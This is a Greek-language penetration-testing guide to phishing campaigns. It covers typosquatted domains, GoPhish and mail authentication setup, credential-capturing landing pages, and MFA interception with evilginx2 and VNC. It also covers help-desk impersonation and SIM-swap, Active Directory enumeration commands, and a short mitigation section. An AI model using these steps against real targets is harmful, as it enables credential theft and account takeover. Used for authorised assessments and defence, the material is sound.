# Μεθοδολογία Phishing

{{#include ../../banners/hacktricks-training.md}}

## Μεθοδολογία

1. Κάντε αναγνώριση του θύματος
   1. Επιλέξτε το **domain του θύματος**.
   2. Κάντε βασική απαρίθμηση στον ιστό, **αναζητώντας πύλες σύνδεσης** που χρησιμοποιεί το θύμα, και **αποφασίστε** ποια θα **προσποιηθείτε**.
   3. Χρησιμοποιήστε **OSINT** για να **βρείτε email**.
2. Προετοιμάστε το περιβάλλον
   1. **Αγοράστε το domain** που θα χρησιμοποιήσετε για την αξιολόγηση phishing.
   2. **Ρυθμίστε τις σχετικές εγγραφές της υπηρεσίας email** (SPF, DMARC, DKIM, rDNS).
   3. Ρυθμίστε το VPS με **gophish**.
3. Προετοιμάστε την καμπάνια
   1. Ετοιμάστε το **πρότυπο email**.
   2. Ετοιμάστε την **ιστοσελίδα** για την υποκλοπή των διαπιστευτηρίων.
4. Ξεκινήστε την καμπάνια!

## Δημιουργία παρόμοιων domain names ή αγορά αξιόπιστου domain

### Τεχνικές παραλλαγής ονομάτων domain

- **Λέξη-κλειδί**: Το όνομα του domain **περιέχει** μια σημαντική **λέξη-κλειδί** του αρχικού domain (π.χ. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Subdomain με ενωτικό**: Αντικαταστήστε την **τελεία με ενωτικό** σε ένα subdomain (π.χ. www-zelster.com).
- **Νέο TLD**: Το ίδιο domain με **νέο TLD** (π.χ. zelster.org).
- **Homoglyph**: **Αντικαθιστά** ένα γράμμα στο όνομα του domain με **γράμματα που μοιάζουν** (π.χ. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Μετάθεση:** **Αντιστρέφει τη θέση δύο γραμμάτων** στο όνομα του domain (π.χ. zelsetr.com).
- **Ενικός/πληθυντικός**: Προσθέτει ή αφαιρεί το «s» στο τέλος του ονόματος του domain (π.χ. zeltsers.com).
- **Παράλειψη**: **Αφαιρεί ένα** από τα γράμματα του ονόματος του domain (π.χ. zelser.com).
- **Επανάληψη:** **Επαναλαμβάνει ένα** από τα γράμματα του ονόματος του domain (π.χ. zeltsser.com).
- **Αντικατάσταση**: Όπως το homoglyph, αλλά λιγότερο διακριτική. Αντικαθιστά ένα από τα γράμματα του ονόματος του domain, ίσως με ένα γράμμα που βρίσκεται κοντά στο αρχικό γράμμα στο πληκτρολόγιο (π.χ. zektser.com).
- **Προσθήκη subdomain**: Προσθέτει μια **τελεία** μέσα στο όνομα του domain (π.χ. ze.lster.com).
- **Εισαγωγή**: **Εισάγει ένα γράμμα** στο όνομα του domain (π.χ. zerltser.com).
- **Παράλειψη τελείας**: Προσθέτει το TLD στο τέλος του ονόματος του domain (π.χ. zelstercom.com).

**Αυτόματα εργαλεία**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Ιστότοποι**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Υπάρχει **πιθανότητα κάποια από τα bits που είναι αποθηκευμένα ή μεταδίδονται να αντιστραφούν αυτόματα** εξαιτίας διάφορων παραγόντων, όπως οι ηλιακές εκλάμψεις, οι κοσμικές ακτίνες ή σφάλματα υλικού.

Όταν αυτή η έννοια **εφαρμόζεται σε αιτήματα DNS**, είναι πιθανό το **domain που λαμβάνει ο DNS server** να μην είναι το ίδιο με το domain που ζητήθηκε αρχικά.

Για παράδειγμα, η τροποποίηση ενός μόνο bit στο domain «windows.com» μπορεί να το μετατρέψει σε «windnws.com».

Οι επιτιθέμενοι μπορεί να **επωφεληθούν από αυτό καταχωρίζοντας πολλαπλά domain με bit-flipping** που μοιάζουν με το domain του θύματος. Σκοπός τους είναι να ανακατευθύνουν νόμιμους χρήστες στη δική τους υποδομή.

Για περισσότερες πληροφορίες, διαβάστε [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Αγορά αξιόπιστου domain

Μπορείτε να αναζητήσετε ένα ληγμένο domain που μπορείτε να χρησιμοποιήσετε στο [https://www.expireddomains.net/](https://www.expireddomains.net).\
Για να βεβαιωθείτε ότι το ληγμένο domain που πρόκειται να αγοράσετε **έχει ήδη καλό SEO**, μπορείτε να αναζητήσετε την κατηγορία στην οποία ανήκει στις εξής υπηρεσίες:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Εντοπισμός email

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% δωρεάν)
- [https://phonebook.cz/](https://phonebook.cz) (100% δωρεάν)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Για να **εντοπίσετε περισσότερες** έγκυρες διευθύνσεις email ή να **επαληθεύσετε όσες** έχετε ήδη εντοπίσει, μπορείτε να ελέγξετε αν μπορείτε να τις κάνετε brute-force στους SMTP servers του θύματος. [Μάθετε εδώ πώς να επαληθεύετε/εντοπίζετε διευθύνσεις email](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Επιπλέον, μην ξεχνάτε ότι αν οι χρήστες χρησιμοποιούν **κάποια διαδικτυακή πύλη για πρόσβαση στα email τους**, μπορείτε να ελέγξετε αν είναι ευάλωτη σε **brute force ονομάτων χρήστη** και να εκμεταλλευτείτε την ευπάθεια, αν είναι δυνατό.

## Ρύθμιση του GoPhish

### Εγκατάσταση

Μπορείτε να το κατεβάσετε από το [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Κατεβάστε το, αποσυμπιέστε το στο `/opt/gophish` και εκτελέστε το `/opt/gophish/gophish`\
Στην έξοδο θα εμφανιστεί ένας κωδικός πρόσβασης για τον χρήστη admin στη θύρα 3333. Επομένως, συνδεθείτε σε αυτήν τη θύρα και χρησιμοποιήστε αυτά τα διαπιστευτήρια για να αλλάξετε τον κωδικό πρόσβασης του admin. Ίσως χρειαστεί να κάνετε tunnel αυτήν τη θύρα προς το τοπικό μηχάνημα:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Διαμόρφωση

**Διαμόρφωση πιστοποιητικού TLS**

Πριν από αυτό το βήμα, θα πρέπει να έχετε **ήδη αγοράσει το domain** που πρόκειται να χρησιμοποιήσετε και αυτό πρέπει να **δείχνει** στη **διεύθυνση IP του VPS** όπου διαμορφώνετε το **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Ρύθμιση αλληλογραφίας**

Ξεκινήστε την εγκατάσταση: `apt-get install postfix`

Στη συνέχεια, προσθέστε το domain στα παρακάτω αρχεία:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Αλλάξτε επίσης τις τιμές των παρακάτω μεταβλητών μέσα στο /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Τέλος, τροποποιήστε τα αρχεία **`/etc/hostname`** και **`/etc/mailname`** ώστε να περιέχουν το όνομα του domain σας και **επανεκκινήστε το VPS.**

Τώρα, δημιουργήστε μια **εγγραφή DNS A** για το `mail.<domain>` που να δείχνει στη **διεύθυνση IP** του VPS και μια **εγγραφή DNS MX** που να δείχνει στο `mail.<domain>`

Τώρα ας δοκιμάσουμε να στείλουμε ένα email:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Ρύθμιση του Gophish**

Σταματήστε την εκτέλεση του gophish και ας το ρυθμίσουμε.\
Τροποποιήστε το `/opt/gophish/config.json` ως εξής (σημειώστε τη χρήση του https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Ρύθμιση της υπηρεσίας gophish**

Για να δημιουργήσετε την υπηρεσία gophish, ώστε να ξεκινά αυτόματα και να μπορείτε να τη διαχειρίζεστε ως υπηρεσία, μπορείτε να δημιουργήσετε το αρχείο `/etc/init.d/gophish` με το ακόλουθο περιεχόμενο:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Ολοκληρώστε τη ρύθμιση της υπηρεσίας και ελέγξτε την ως εξής:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Διαμόρφωση mail server και domain

### Περιμένετε και δείξτε αξιοπιστία

Όσο παλαιότερο είναι ένα domain, τόσο λιγότερο πιθανό είναι να εντοπιστεί ως spam. Επομένως, θα πρέπει να περιμένετε όσο το δυνατόν περισσότερο (τουλάχιστον 1 εβδομάδα) πριν από το phishing assessment. Επιπλέον, αν προσθέσετε μια σελίδα για έναν τομέα με καλή φήμη, η φήμη που θα αποκτήσετε θα είναι καλύτερη.

Σημειώστε ότι, ακόμη κι αν πρέπει να περιμένετε μία εβδομάδα, μπορείτε να ολοκληρώσετε τη διαμόρφωση όλων τώρα.

### Διαμόρφωση εγγραφής Reverse DNS (rDNS)

Ορίστε μια εγγραφή rDNS (PTR) που επιλύει τη διεύθυνση IP του VPS στο όνομα domain.

### Εγγραφή Sender Policy Framework (SPF)

Πρέπει να **διαμορφώσετε μια εγγραφή SPF για το νέο domain**. Αν δεν γνωρίζετε τι είναι μια εγγραφή SPF, [**διαβάστε αυτήν τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Μπορείτε να χρησιμοποιήσετε το [https://www.spfwizard.net/](https://www.spfwizard.net) για να δημιουργήσετε την πολιτική SPF (χρησιμοποιήστε την IP του VPS).

![Φόρμα SPF Wizard για τη δημιουργία εγγραφής SPF για domain phishing](<../../images/image (1037).png>)

Αυτό είναι το περιεχόμενο που πρέπει να οριστεί σε μια εγγραφή TXT μέσα στο domain:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Εγγραφή Domain-based Message Authentication, Reporting & Conformance (DMARC)

Πρέπει να **διαμορφώσετε μια εγγραφή DMARC για το νέο domain**. Αν δεν γνωρίζετε τι είναι μια εγγραφή DMARC, [**διαβάστε αυτή τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Πρέπει να δημιουργήσετε μια νέα εγγραφή DNS TXT που να δείχνει στο hostname `_dmarc.<domain>` με το ακόλουθο περιεχόμενο:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Πρέπει να **ρυθμίσετε ένα DKIM για το νέο domain**. Αν δεν γνωρίζετε τι είναι μια εγγραφή DKIM, [**διαβάστε αυτή τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Αυτό το tutorial βασίζεται στο: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Πρέπει να συνενώσετε και τις δύο τιμές B64 που δημιουργεί το κλειδί DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Ελέγξτε τη βαθμολογία διαμόρφωσης του email σας

Μπορείτε να το κάνετε μέσω του [https://www.mail-tester.com/](https://www.mail-tester.com)\
Απλώς επισκεφτείτε τη σελίδα και στείλτε ένα email στη διεύθυνση που σας δίνουν:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Μπορείτε επίσης να **ελέγξετε τη διαμόρφωση του email σας** στέλνοντας ένα email στη διεύθυνση `check-auth@verifier.port25.com` και **διαβάζοντας την απάντηση** (γι' αυτό θα χρειαστεί να **ανοίξετε** τη θύρα **25** και να δείτε την απάντηση στο αρχείο _/var/mail/root_, αν στείλετε το email ως root).\
Βεβαιωθείτε ότι περνάτε όλες τις δοκιμές:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Μπορείτε επίσης να στείλετε **ένα μήνυμα σε έναν λογαριασμό Gmail που ελέγχετε** και να ελέγξετε τις **κεφαλίδες του email** στα εισερχόμενα του Gmail σας. Θα πρέπει να υπάρχει `dkim=pass` στο πεδίο κεφαλίδας `Authentication-Results`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Αφαίρεση από τη μαύρη λίστα του Spamhaus

Η σελίδα [www.mail-tester.com](https://www.mail-tester.com) μπορεί να σας ενημερώσει αν το domain σας αποκλείεται από το Spamhaus. Μπορείτε να ζητήσετε την αφαίρεση του domain/IP σας στη διεύθυνση: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Αφαίρεση από τη μαύρη λίστα της Microsoft

​​Μπορείτε να ζητήσετε την αφαίρεση του domain/IP σας στη διεύθυνση [https://sender.office.com/](https://sender.office.com).

## Δημιουργία & εκκίνηση καμπάνιας GoPhish

### Προφίλ αποστολής

- Ορίστε ένα **όνομα αναγνώρισης** για το προφίλ αποστολέα
- Αποφασίστε από ποιον λογαριασμό θα στείλετε τα phishing email. Προτάσεις: _noreply, support, servicedesk, salesforce..._
- Μπορείτε να αφήσετε κενά το όνομα χρήστη και τον κωδικό πρόσβασης, αλλά βεβαιωθείτε ότι έχετε επιλέξει το Ignore Certificate Errors

![Δημιουργία & εκκίνηση καμπάνιας GoPhish - Προφίλ αποστολής: Μπορείτε να αφήσετε κενά το όνομα χρήστη και τον κωδικό πρόσβασης, αλλά βεβαιωθείτε ότι έχετε επιλέξει το Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Συνιστάται να χρησιμοποιήσετε τη λειτουργία "**Send Test Email**" για να ελέγξετε ότι όλα λειτουργούν.\
> Θα συνιστούσα να **στείλετε τα δοκιμαστικά email σε διευθύνσεις 10min mail**, ώστε να αποφύγετε τον αποκλεισμό σας κατά τις δοκιμές.

### Πρότυπο email

- Ορίστε ένα **όνομα αναγνώρισης** για το πρότυπο
- Έπειτα, γράψτε ένα **θέμα** (τίποτα ασυνήθιστο, απλώς κάτι που θα περιμένατε να διαβάσετε σε ένα συνηθισμένο email)
- Βεβαιωθείτε ότι έχετε επιλέξει το "**Add Tracking Image**"
- Γράψτε το **πρότυπο email** (μπορείτε να χρησιμοποιήσετε μεταβλητές όπως στο παρακάτω παράδειγμα):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Σημειώστε ότι **για να αυξήσετε την αξιοπιστία του email**, συνιστάται να χρησιμοποιήσετε μια υπογραφή από κάποιο email του πελάτη. Προτάσεις:

- Στείλτε ένα email σε μια **ανύπαρκτη διεύθυνση** και ελέγξτε αν η απάντηση περιλαμβάνει υπογραφή.
- Αναζητήστε **δημόσια email**, όπως info@ex.com, press@ex.com ή public@ex.com, στείλτε τους ένα email και περιμένετε την απάντηση.
- Προσπαθήστε να επικοινωνήσετε με κάποιο **έγκυρο email που εντοπίσατε** και περιμένετε την απάντηση.

![Προφίλ αποστολής - Πρότυπο email: Προσπαθήστε να επικοινωνήσετε με κάποιο έγκυρο email που εντοπίσατε και περιμένετε την απάντηση](<../../images/image (80).png>)

> [!TIP]
> Το Email Template επιτρέπει επίσης να **επισυνάψετε αρχεία προς αποστολή**. Αν θέλετε επίσης να υποκλέψετε NTLM challenges χρησιμοποιώντας ειδικά διαμορφωμένα αρχεία/έγγραφα, [διαβάστε αυτή τη σελίδα](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Σελίδα προορισμού

- Γράψτε ένα **όνομα**
- **Γράψτε τον κώδικα HTML** της ιστοσελίδας. Σημειώστε ότι μπορείτε να **εισαγάγετε** ιστοσελίδες.
- Επιλέξτε **Capture Submitted Data** και **Capture Passwords**
- Ορίστε μια **ανακατεύθυνση**

![Πρότυπο email - Σελίδα προορισμού: Επιλέξτε Capture Submitted Data και Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Συνήθως θα χρειαστεί να τροποποιήσετε τον κώδικα HTML της σελίδας και να κάνετε ορισμένες δοκιμές τοπικά (ίσως χρησιμοποιώντας κάποιον Apache server) **μέχρι να σας ικανοποιεί το αποτέλεσμα.** Στη συνέχεια, γράψτε αυτόν τον κώδικα HTML στο πλαίσιο.\
> Σημειώστε ότι αν χρειάζεται να **χρησιμοποιήσετε στατικούς πόρους** για το HTML (ίσως κάποια αρχεία CSS και JS), μπορείτε να τα αποθηκεύσετε στο _**/opt/gophish/static/endpoint**_ και έπειτα να αποκτήσετε πρόσβαση σε αυτά από το _**/static/\<filename>**_

> [!TIP]
> Για την ανακατεύθυνση, μπορείτε να **ανακατευθύνετε τους χρήστες στην πραγματική κύρια ιστοσελίδα** του θύματος ή, για παράδειγμα, να τους ανακατευθύνετε στο _/static/migration.html_, να εμφανίσετε έναν **περιστρεφόμενο τροχό (**[**https://loading.io/**](https://loading.io)**) για 5 δευτερόλεπτα και στη συνέχεια να υποδείξετε ότι η διαδικασία ολοκληρώθηκε με επιτυχία**.

### Χρήστες και ομάδες

- Ορίστε ένα όνομα
- **Εισαγάγετε τα δεδομένα** (σημειώστε ότι για να χρησιμοποιήσετε το πρότυπο του παραδείγματος, χρειάζεστε το όνομα, το επώνυμο και τη διεύθυνση email κάθε χρήστη)

![Σελίδα προορισμού - Χρήστες και ομάδες: Εισαγάγετε τα δεδομένα (σημειώστε ότι για να χρησιμοποιήσετε το πρότυπο του παραδείγματος, χρειάζεστε το όνομα, το επώνυμο και τη διεύθυνση email κάθε χρήστη)](<../../images/image (163).png>)

### Καμπάνια

Τέλος, δημιουργήστε μια καμπάνια επιλέγοντας όνομα, πρότυπο email, σελίδα προορισμού, URL, προφίλ αποστολής και ομάδα. Σημειώστε ότι το URL θα είναι ο σύνδεσμος που θα σταλεί στα θύματα.

Σημειώστε ότι το **Sending Profile σάς επιτρέπει να στείλετε ένα δοκιμαστικό email, για να δείτε πώς θα εμφανίζεται το τελικό phishing email**:

![Χρήστες και ομάδες - Καμπάνια: Σημειώστε ότι το Sending Profile σάς επιτρέπει να στείλετε ένα δοκιμαστικό email, για να δείτε πώς θα εμφανίζεται το τελικό phishing email](<../../images/image (192).png>)

Όταν όλα είναι έτοιμα, απλώς ξεκινήστε την καμπάνια!

## Κλωνοποίηση ιστοσελίδας

Αν για οποιονδήποτε λόγο θέλετε να κλωνοποιήσετε την ιστοσελίδα, δείτε την ακόλουθη σελίδα:


{{#ref}}
clone-a-website.md
{{#endref}}

## Έγγραφα και αρχεία με backdoor

Σε ορισμένες αξιολογήσεις phishing (κυρίως για Red Teams), θα θέλετε επίσης να **στείλετε αρχεία που περιέχουν κάποιο είδος backdoor** (ίσως ένα C2 ή απλώς κάτι που θα ενεργοποιήσει μια διαδικασία authentication).\
Δείτε την ακόλουθη σελίδα για μερικά παραδείγματα:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Μέσω Proxy MitM

Η προηγούμενη επίθεση είναι αρκετά έξυπνη, καθώς προσποιείστε ότι είστε μια πραγματική ιστοσελίδα και συλλέγετε τις πληροφορίες που εισάγει ο χρήστης. Δυστυχώς, αν ο χρήστης δεν εισαγάγει τον σωστό κωδικό πρόσβασης ή αν η εφαρμογή που προσποιείστε ότι είστε έχει ρυθμιστεί με 2FA, **αυτές οι πληροφορίες δεν θα σας επιτρέψουν να υποδυθείτε τον εξαπατημένο χρήστη**.

Εδώ είναι χρήσιμα εργαλεία όπως τα [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) και [**muraena**](https://github.com/muraenateam/muraena). Αυτό το εργαλείο σάς επιτρέπει να εκτελέσετε μια επίθεση τύπου MitM. Βασικά, η επίθεση λειτουργεί ως εξής:

1. **Προσποιείστε τη φόρμα σύνδεσης** της πραγματικής ιστοσελίδας.
2. Ο χρήστης **στέλνει** τα **διαπιστευτήριά** του στην ψεύτικη σελίδα σας και το εργαλείο τα στέλνει στην πραγματική ιστοσελίδα, **ελέγχοντας αν είναι έγκυρα**.
3. Αν ο λογαριασμός έχει ρυθμιστεί με **2FA**, η σελίδα MitM θα ζητήσει τον κωδικό 2FA και, μόλις τον **εισαγάγει ο χρήστης**, το εργαλείο θα τον στείλει στην πραγματική ιστοσελίδα.
4. Μόλις γίνει authentication του χρήστη, εσείς (ως attacker) θα έχετε **υποκλέψει τα διαπιστευτήρια, το 2FA, το cookie και οποιεσδήποτε πληροφορίες από κάθε αλληλεπίδραση κατά τη διάρκεια της επίθεσης MitM από το εργαλείο**.

### Μέσω VNC

Τι θα γινόταν αν, αντί να **στείλετε το θύμα σε μια κακόβουλη σελίδα** που μοιάζει με την αρχική, το στέλνατε σε μια **συνεδρία VNC με browser συνδεδεμένο στην πραγματική ιστοσελίδα**; Θα μπορούσατε να δείτε τι κάνει, να κλέψετε τον κωδικό πρόσβασης, το MFA που χρησιμοποιήθηκε, τα cookies...\
Μπορείτε να το κάνετε αυτό με το [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Εντοπισμός της ανίχνευσης

Προφανώς, ένας από τους καλύτερους τρόπους για να μάθετε αν σας εντόπισαν είναι να **αναζητήσετε το domain σας σε blacklists**. Αν εμφανίζεται σε αυτές, σημαίνει ότι με κάποιον τρόπο το domain σας αναγνωρίστηκε ως ύποπτο.\
Ένας εύκολος τρόπος για να ελέγξετε αν το domain σας εμφανίζεται σε κάποια blacklist είναι να χρησιμοποιήσετε το [https://malwareworld.com/](https://malwareworld.com)

Ωστόσο, υπάρχουν και άλλοι τρόποι για να μάθετε αν το θύμα **αναζητά ενεργά ύποπτη δραστηριότητα phishing στο διαδίκτυο**, όπως εξηγείται εδώ:


{{#ref}}
detecting-phising.md
{{#endref}}

Μπορείτε να **αγοράσετε ένα domain με όνομα πολύ παρόμοιο** με το domain του θύματος **και/ή να δημιουργήσετε ένα certificate** για **subdomain** ενός domain που ελέγχετε, το οποίο **περιέχει** τη **λέξη-κλειδί** του domain του θύματος. Αν το **θύμα** πραγματοποιήσει οποιουδήποτε είδους **αλληλεπίδραση DNS ή HTTP** με αυτά, θα γνωρίζετε ότι **αναζητά ενεργά** ύποπτα domains και θα χρειαστεί να κινηθείτε με μεγάλη διακριτικότητα.<sup>[[2]](#references)</sup>

### Αξιολόγηση του phishing

Χρησιμοποιήστε το [**Phishious** ](https://github.com/Rices/Phishious) για να αξιολογήσετε αν το email σας θα καταλήξει στον φάκελο ανεπιθύμητης αλληλογραφίας ή αν θα αποκλειστεί ή θα παραδοθεί με επιτυχία.

## Συμβιβασμός ταυτότητας υψηλής επαφής (επαναφορά MFA από Help Desk)

Οι σύγχρονες ομάδες εισβολέων παρακάμπτουν όλο και συχνότερα τα email lures και **στοχεύουν απευθείας τη διαδικασία ανάκτησης ταυτότητας / εξυπηρέτησης χρηστών**, για να παρακάμψουν το MFA. Η επίθεση βασίζεται εξ ολοκλήρου σε τεχνικές "living-off-the-land": μόλις ο χειριστής αποκτήσει έγκυρα διαπιστευτήρια, κινείται πλευρικά χρησιμοποιώντας ενσωματωμένα εργαλεία διαχείρισης – δεν απαιτείται malware.<sup>[[6]](#references)</sup>

### Ροή επίθεσης
1. Κάντε αναγνώριση του θύματος 
   * Συλλέξτε προσωπικά και εταιρικά στοιχεία από το LinkedIn, διαρροές δεδομένων, δημόσια GitHub κ.λπ.  
   * Εντοπίστε ταυτότητες υψηλής αξίας (στελέχη, IT, οικονομικό τμήμα) και προσδιορίστε την **ακριβή διαδικασία του Help Desk** για επαναφορά κωδικού πρόσβασης / MFA.
2. Κοινωνική μηχανική σε πραγματικό χρόνο  
   * Καλέστε τηλεφωνικά, επικοινωνήστε μέσω Teams ή μέσω chat με το Help Desk, προσποιούμενοι ότι είστε ο στόχος (συχνά με **πλαστογραφημένο αναγνωριστικό κλήσης** ή **κλωνοποιημένη φωνή**).  
   * Δώστε τα προσωπικά στοιχεία (PII) που συλλέξατε προηγουμένως, για να περάσετε την επαλήθευση βάσει γνώσεων.  
   * Πείστε τον εκπρόσωπο να **επαναφέρει το μυστικό MFA** ή να πραγματοποιήσει **SIM-swap** σε καταχωρισμένο αριθμό κινητού.
3. Άμεσες ενέργειες μετά την πρόσβαση (≤60 λεπτά σε πραγματικές περιπτώσεις)  
   * Δημιουργήστε ένα αρχικό σημείο πρόσβασης μέσω οποιασδήποτε web SSO portal.  
   * Κάντε απαρίθμηση του AD / AzureAD με ενσωματωμένα εργαλεία (χωρίς να εγκαταστήσετε binaries):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Πλευρική μετακίνηση με **WMI**, **PsExec** ή νόμιμους agents **RMM** που είναι ήδη στη λίστα επιτρεπόμενων στο περιβάλλον.

### Ανίχνευση & Μετριασμός
* Αντιμετωπίζετε την ανάκτηση ταυτότητας από το help desk ως **προνομιακή λειτουργία** – απαιτήστε step-up auth και έγκριση από manager.
* Αναπτύξτε κανόνες **Identity Threat Detection & Response (ITDR)** / **UEBA** που δημιουργούν ειδοποιήσεις για:  
  * Αλλαγή μεθόδου MFA + έλεγχο ταυτότητας από νέα συσκευή / γεωγραφική τοποθεσία.  
  * Άμεση ανύψωση προνομίων του ίδιου principal (user-→-admin).
* Καταγράφετε τις κλήσεις στο help desk και απαιτείτε **επιστροφή κλήσης σε ήδη καταχωρισμένο αριθμό** πριν από οποιαδήποτε επαναφορά.
* Εφαρμόστε **Just-In-Time (JIT) / Privileged Access**, ώστε οι λογαριασμοί που μόλις επαναφέρθηκαν να **μην** κληρονομούν αυτόματα tokens υψηλών προνομίων.

---

## Εξαπάτηση σε μεγάλη κλίμακα – SEO Poisoning & καμπάνιες “ClickFix”
